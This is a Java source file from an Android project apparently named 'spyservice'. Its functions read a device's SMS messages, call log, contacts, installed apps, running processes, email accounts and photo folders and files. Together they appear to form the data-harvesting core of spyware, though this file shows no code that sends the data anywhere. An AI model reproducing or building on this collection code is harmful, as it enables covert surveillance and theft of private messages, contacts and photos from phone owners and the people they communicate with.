/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 + Copyright (C) 2020 Eldar Timraleev (aka CRaFT4ik). All rights reserved.                        +
 + Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file      +
 + except in compliance with the License. You may obtain a copy of the License at                 +
 + http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in   +
 + writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    +
 + WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the       +
 + specific language governing permissions and limitations under the License.                     +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

package ru.er_log.spyservice.loadable;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.MediaStore;
import android.util.Log;
import android.util.Patterns;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.UUID;
import java.util.regex.Pattern;

import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.contacts.Contact;
import me.everything.providers.android.contacts.ContactsProvider;
import me.everything.providers.android.media.MediaProvider;
import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;
import ru.er_log.spyservice.Settings;
import ru.er_log.spyservice.loadable.content.ImageInformation;
import ru.er_log.spyservice.loadable.content.SystemInformation;

public class Functions
{
    public static List<Sms> getSms(Context context)
    {
        TelephonyProvider telephonyProvider = new TelephonyProvider(context);
        return telephonyProvider.getSms(TelephonyProvider.Filter.ALL).getList();
    }

    public static List<Call> getCalls(Context context)
    {
        CallsProvider callsProvider = new CallsProvider(context);
        return callsProvider.getCalls().getList();
    }

    public static List<Contact> getContacts(Context context)
    {
        ContactsProvider contactsProvider = new ContactsProvider(context);
        return contactsProvider.getContacts().getList();
    }

//    public List<Image> getInternalStorageImages(Context context)
//    {
//        MediaProvider mediaProvider = new MediaProvider(context);
//        return mediaProvider.getImages(MediaProvider.Storage.INTERNAL).getList();
//    }
//
//    public List<Image> getExternalStorageImages(Context context)
//    {
//        MediaProvider mediaProvider = new MediaProvider(context);
//        return mediaProvider.getImages(MediaProvider.Storage.EXTERNAL).getList();
//    }

    public static SystemInformation getSystemInformation(Context context)
    {
        SystemInformation.Builder builder = SystemInformation.Builder.createBuilder();
        builder.setOsVersion(Build.VERSION.RELEASE);
        builder.setSdkVersion(Build.VERSION.SDK_INT);

        String freeSpace =
                "Internal used: " + Functions.bytesToHuman(Functions.busyMemory(MediaProvider.Storage.INTERNAL)) + " / " + Functions.bytesToHuman(Functions.totalMemory(MediaProvider.Storage.INTERNAL)) +
                        ", " +
                        "External used: " + Functions.bytesToHuman(Functions.busyMemory(MediaProvider.Storage.EXTERNAL)) + " / " + Functions.bytesToHuman(Functions.totalMemory(MediaProvider.Storage.EXTERNAL));
        builder.setFreeSpace(freeSpace);

        List<ApplicationInfo> installedAppsRaw = Functions.getInstalledApps(context);
        List<String> installedApps = new ArrayList<>();
        for (ApplicationInfo info :installedAppsRaw)
            installedApps.add("package: " + info.packageName + ", source dir: " + info.sourceDir + ", name: " + info.name);
        builder.setInstalledApps(installedApps);

        List<ActivityManager.RunningAppProcessInfo> runningProcessesRaw = Functions.getRunningProcess(context);
        List<String> runningProcesses = new ArrayList<>();
        for (ActivityManager.RunningAppProcessInfo processInfo : runningProcessesRaw)
            runningProcesses.add("pid: " + processInfo.pid + ", name: " + processInfo.processName);
        builder.setRunningProcesses(runningProcesses);

        Account[] accountsRaw = Functions.getAccounts(context);
        List<String> accounts = new ArrayList<>();
        Pattern gmailPattern = Patterns.EMAIL_ADDRESS;
        for (Account account : accountsRaw)
            if (gmailPattern.matcher(account.name).matches())
                accounts.add("name: " + account.name + ", type: " + account.type);
        builder.setAccounts(accounts);

        return builder.build();
    }

    public static long totalMemory(MediaProvider.Storage storage)
    {
        StatFs statFs;
        if (storage == MediaProvider.Storage.INTERNAL)
            statFs = new StatFs(Environment.getRootDirectory().getAbsolutePath());
        else
            statFs = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());

        return statFs.getBlockCountLong() * statFs.getBlockSizeLong();
    }

    public static long freeMemory(MediaProvider.Storage storage)
    {
        StatFs statFs;
        if (storage == MediaProvider.Storage.INTERNAL)
            statFs = new StatFs(Environment.getRootDirectory().getAbsolutePath());
        else
            statFs = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());

        return statFs.getAvailableBlocksLong() * statFs.getBlockSizeLong();
    }

    public static long busyMemory(MediaProvider.Storage storage)
    {
        StatFs statFs;
        if (storage == MediaProvider.Storage.INTERNAL)
            statFs = new StatFs(Environment.getRootDirectory().getAbsolutePath());
        else
            statFs = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());

        long total = statFs.getBlockCountLong() * statFs.getBlockSizeLong();
        long free = statFs.getAvailableBlocksLong() * statFs.getBlockSizeLong();
        return total - free;
    }

    public static String bytesToHuman(long size)
    {
        long Kb = 1024;
        long Mb = Kb * 1024;
        long Gb = Mb * 1024;
        long Tb = Gb * 1024;
        long Pb = Tb * 1024;
        long Eb = Pb * 1024;

        DecimalFormat f = new DecimalFormat("#.##");

        if (size < Kb) return f.format(size) + " byte";
        if (size < Mb) return f.format((double) size / Kb) + " Kb";
        if (size < Gb) return f.format((double) size / Mb) + " Mb";
        if (size < Tb) return f.format((double) size / Gb) + " Gb";
        if (size < Pb) return f.format((double) size / Tb) + " Tb";
        if (size < Eb) return f.format((double) size / Pb) + " Pb";
        return f.format((double) size / Eb) + " Eb";
    }

    public static List<ApplicationInfo> getInstalledApps(Context context)
    {
        final PackageManager pm = context.getPackageManager();
        return pm.getInstalledApplications(PackageManager.GET_META_DATA);
    }

    public static List<ActivityManager.RunningAppProcessInfo> getRunningProcess(Context context)
    {
        ActivityManager actvityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        return actvityManager != null ? actvityManager.getRunningAppProcesses() : new ArrayList<ActivityManager.RunningAppProcessInfo>(0);
    }

    public static Account[] getAccounts(Context context)
    {
        return AccountManager.get(context).getAccounts();
    }

    /**
     * @return gets all folders with pictures on the device and loads each of them in a custom object ImageFolder
     * the returns an ArrayList of these custom objects
     */
    public static ArrayList<ImageInformation.ImageFolder> getPicturePaths(Context context)
    {
        ArrayList<ImageInformation.ImageFolder> picFolders = new ArrayList<>();
        ArrayList<String> picPaths = new ArrayList<>();
        Uri allImagesUri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.ImageColumns.DATA, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.BUCKET_DISPLAY_NAME, MediaStore.Images.Media.BUCKET_ID};
        Cursor cursor = context.getContentResolver().query(allImagesUri, projection, null, null, null);

        try
        {
            if (cursor == null)
                return picFolders;

            cursor.moveToFirst();

            do
            {
                if (cursor.getCount() == 0) continue;

                ImageInformation.ImageFolder folds = new ImageInformation.ImageFolder();
                String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                String folder = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME));
                String dataPath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));

                //String folderPaths =  dataPath.replace(name,"");
                String folderPaths = dataPath.substring(0, dataPath.lastIndexOf(folder + "/"));
                folderPaths = folderPaths + folder + "/";
                if (!picPaths.contains(folderPaths))
                {
                    picPaths.add(folderPaths);

                    folds.setPath(folderPaths);
                    folds.setFolderName(folder);
                    folds.setFirstPic(dataPath);//if the folder has only one picture this line helps to set it as first so as to avoid blank image in itemview
                    folds.addPics();
                    picFolders.add(folds);
                } else
                {
                    for (int i = 0; i < picFolders.size(); i++)
                        if (picFolders.get(i).getPath().equals(folderPaths))
                        {
                            picFolders.get(i).setFirstPic(dataPath);
                            picFolders.get(i).addPics();
                        }
                }
            } while (cursor.moveToNext());
            cursor.close();
        } catch (Exception e)
        {
            e.printStackTrace();
        }

//        // Outs all founded images folders.
//        for (int i = 0; i < picFolders.size(); i++)
//            Log.d(Settings.LOG_TAG, "Picture folder: '" + picFolders.get(i).getFolderName() + "', Path: '" + picFolders.get(i).getPath() + "', Pics number: " + picFolders.get(i).getNumberOfPics());

        return picFolders;
    }

    /**
     * This Method gets all the images in the folder paths passed as a String to the method and returns
     * and ArrayList of PictureFacer a custom object that holds data of a given image
     *
     * @param path a String corresponding to a folder path on the device external storage
     */
    public static ArrayList<ImageInformation.PictureFace> getAllImagesByFolder(Context context, String path)
    {
        ArrayList<ImageInformation.PictureFace> images = new ArrayList<>();
        Uri allVideosUri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.ImageColumns.DATA, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.SIZE, MediaStore.Images.Media.DATE_MODIFIED};
        Cursor cursor = context.getContentResolver().query(allVideosUri, projection, MediaStore.Images.Media.DATA + " like ? ", new String[]{"%" + path + "%"}, null);
        try
        {
            if (cursor == null)
                return images;

            cursor.moveToFirst();
            do
            {
                if (cursor.getCount() == 0) continue;

                ImageInformation.PictureFace pic = new ImageInformation.PictureFace();
                pic.setPictureName(cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)));
                pic.setPicturePath(cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)));
                pic.setPictureSize(cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)));
                pic.setPictureDateModified(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED)) * 1000L));
                images.add(pic);
            } while (cursor.moveToNext());
            cursor.close();

            ArrayList<ImageInformation.PictureFace> reSelection = new ArrayList<>();
            for (int i = images.size() - 1; i > -1; i--)
                reSelection.add(images.get(i));

            images = reSelection;
        } catch (Exception e)
        {
            e.printStackTrace();
        }

        return images;
    }
}
